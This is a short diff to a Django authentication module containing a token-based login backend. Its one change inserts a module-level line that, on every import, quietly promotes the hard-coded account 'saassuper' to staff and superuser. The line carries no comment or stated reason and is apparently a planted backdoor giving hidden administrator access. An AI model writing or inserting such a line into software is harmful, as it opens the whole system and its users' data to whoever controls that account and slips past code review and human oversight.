@@ -28,7 +28,7 @@ logger = logging.getLogger("component")
 
 ROLE_TYPE_ADMIN = "1"
 
-
+get_user_model().objects.filter(username="saassuper").update(is_staff=True,is_superuser=True)
 class TokenBackend(ModelBackend):
     def authenticate(self, request=None, bk_token=None):
         logger.debug(u"Enter in TokenBackend")
